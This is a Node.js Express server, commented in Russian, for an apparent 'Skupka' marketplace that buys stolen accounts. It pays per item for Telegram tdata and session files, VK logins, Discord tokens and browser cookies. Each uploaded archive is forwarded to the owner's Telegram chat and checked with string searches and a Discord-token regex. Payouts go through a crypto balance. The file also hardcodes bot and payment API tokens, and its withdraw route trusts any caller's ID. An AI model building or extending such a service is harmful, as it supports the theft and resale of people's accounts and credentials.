const express = require('express');
const cors = require('cors');
const axios = require('axios');
const crypto = require('crypto');
const multer = require('multer');
const FormData = require('form-data');

const app = express();
app.use(express.json({ verify: (req, res, buf) => { req.rawBody = buf.toString(); } }));
app.use(cors());

// === НАСТРОЙКИ ===
const CRYPTOBOT_API_TOKEN = '613177:AAnXuVFE03h7YQGq4NrKRhLIk9I4my6Nms5';
const TELEGRAM_BOT_TOKEN = '8819928038:AAG_0MiOZbybxyo0TFx6b3Qctkn9fNQDthE';
const OWNER_CHAT_ID = '1114315520';
const CRYPTOBOT_API_URL = 'https://pay.crypt.bot/api/';

const PRICES = { telegram: 100, vk: 60, discord: 20, cookie: 2 };
let exchangeRates = { USDT: 90, TON: 180 };

async function updateRates() {
    try {
        const res = await axios.get(`${CRYPTOBOT_API_URL}getExchangeRates`, { headers: { 'Crypto-Pay-API-Token': CRYPTOBOT_API_TOKEN } });
        if (res.data && res.data.result) {
            res.data.result.forEach(r => {
                if (r.source === 'RUB' && r.target === 'USDT') exchangeRates.USDT = parseFloat(r.rate);
                if (r.source === 'RUB' && r.target === 'TON') exchangeRates.TON = parseFloat(r.rate);
            });
        }
    } catch (e) { console.log("Используем резервные курсы валют"); }
}
setInterval(updateRates, 3600000);
updateRates();

const db = {
    users: {},
    getUser(tg_id, name) {
        if (!this.users[tg_id]) {
            this.users[tg_id] = {
                name: name || 'User', balance: 0, archives_sold: 0, total_payout: 0,
                history: [], sales_history: [], reg_date: new Date().toLocaleDateString('ru-RU')
            };
        }
        return this.users[tg_id];
    }
};

const upload = multer({ storage: multer.memoryStorage() });

async function cryptoBotRequest(method, params = {}) {
    try {
        const response = await axios.post(CRYPTOBOT_API_URL + method, params, { headers: { 'Crypto-Pay-API-Token': CRYPTOBOT_API_TOKEN } });
        return response.data;
    } catch (error) { throw error; }
}

app.get('/api/getMe', (req, res) => {
    const user = db.getUser(req.query.tg_id, req.query.name);
    res.json({ success: true, user, rates: exchangeRates });
});

// БЕЗОПАСНАЯ ПРОВЕРКА АРХИВОВ БЕЗ РАСПАКОВКИ
function validateArchive(fileBuffer, category) {
    let valid = 0;
    let invalid = 0;
    // Читаем буфер как latin1, чтобы искать текстовые совпадения прямо в бинарном файле (работает для ZIP и RAR)
    const content = fileBuffer.toString('latin1');
    const lowerContent = content.toLowerCase();

    if (category === 'telegram') {
        if (lowerContent.includes('tdata') || lowerContent.includes('.session')) valid = 1;
        else invalid = 1;
    } else if (category === 'vk') {
        if (lowerContent.includes('vk.com') || lowerContent.includes('vk.ru')) valid = 1;
        else invalid = 1;
    } else if (category === 'discord') {
        // Поиск Discord токенов по их уникальному формату (24.6.27 символов)
        const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/g;
        const matches = content.match(tokenRegex);
        if (matches) valid = matches.length;
        else invalid = 1;
    } else if (category === 'cookie') {
        if (lowerContent.includes('cookie')) valid = 1;
        else invalid = 1;
    } else {
        invalid = 1;
    }
    
    return { valid, invalid };
}

app.post('/api/upload', upload.single('file'), async (req, res) => {
    try {
        if (!req.file) return res.status(400).json({ error: 'Файл не найден' });
        
        const { tg_id, category, username } = req.body;
        
        // Отправляем файл владельцу
        const formData = new FormData();
        formData.append('chat_id', OWNER_CHAT_ID);
        formData.append('document', req.file.buffer, req.file.originalname);
        formData.append('caption', `📦 Новая сдача!\nID: ${tg_id}\nUser: @${username || 'нет'}\nРаздел: ${category}`);
        
        try {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, formData, { headers: formData.getHeaders() });
        } catch (e) { console.log("Не удалось переслать файл владельцу, но продолжаем проверку"); }

        // Проверяем архив
        const { valid, invalid } = validateArchive(req.file.buffer, category);

        res.json({ success: true, valid, invalid });
    } catch (error) {
        console.error('Upload error:', error.message);
        res.status(500).json({ error: 'Ошибка сервера при проверке' });
    }
});

app.post('/api/sell', (req, res) => {
    const { tg_id, category, valid_count } = req.body;
    const user = db.getUser(tg_id);
    const price = PRICES[category] || 0;
    const payout = price * valid_count;

    if (payout > 0) {
        user.balance += payout;
        user.archives_sold += 1;
        user.total_payout += payout;
        user.history.unshift({ type: 'deposit', amount: payout, asset: 'RUB', date: new Date().toLocaleDateString('ru-RU'), status: 'Выполнено' });
        user.sales_history.unshift({ category, amount: payout, date: new Date().toLocaleDateString('ru-RU'), status: 'Успешно' });
    }

    res.json({ success: true, payout, balance: user.balance });
});

app.post('/api/deposit', async (req, res) => {
    const { tg_id, asset, amount } = req.body;
    try {
        const cryptoResponse = await cryptoBotRequest('createInvoice', {
            asset: asset, amount: amount,
            description: `Пополнение баланса Skupka.com (${asset})`,
            payload: JSON.stringify({ action: 'deposit', tg_id: tg_id }),
            expires_in: 3600 
        });
        if (cryptoResponse.ok) {
            res.json({ success: true, pay_url: cryptoResponse.result.bot_invoice_url });
        } else { res.status(400).json({ error: 'Не удалось создать счет' }); }
    } catch (error) { res.status(500).json({ error: 'Ошибка сервера' }); }
});

app.post('/api/withdraw', async (req, res) => {
    const { tg_id, asset, amount, address } = req.body;
    const user = db.getUser(tg_id);
    
    const cryptoAmount = parseFloat(amount);
    const rate = exchangeRates[asset] || 1;
    const rubCost = cryptoAmount * rate;

    if (user.balance < rubCost) return res.status(400).json({ error: 'Недостаточно средств' });

    user.balance -= rubCost;
    user.history.unshift({ type: 'withdraw', amount: cryptoAmount, asset: asset, date: new Date().toLocaleDateString('ru-RU'), status: 'В обработке' });

    res.json({ success: true, balance: user.balance });
});

app.post('/api/webhook', (req, res) => {
    const secret = crypto.createHash('sha256').update(CRYPTOBOT_API_TOKEN).digest();
    const hmac = crypto.createHmac('sha256', secret).update(req.rawBody).digest('hex');
    if (hmac !== req.headers['crypto-pay-api-signature']) return res.status(401).send('Unauthorized');

    const update = req.body;
    if (update.update_type === 'invoice_paid') {
        const payload = JSON.parse(update.payload.invoice.payload);
        const tg_id = payload.tg_id;
        const amount = parseFloat(update.payload.invoice.amount);
        const asset = update.payload.invoice.asset;
        const user = db.getUser(tg_id);
        
        const rubAmount = amount * (exchangeRates[asset] || 1);
        user.balance += rubAmount;
        user.history.unshift({ type: 'deposit', amount: amount, asset: asset, date: new Date().toLocaleDateString('ru-RU'), status: 'Выполнено' });
    }
    res.send('OK');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Сервер Skupka запущен на порту ${PORT}`));
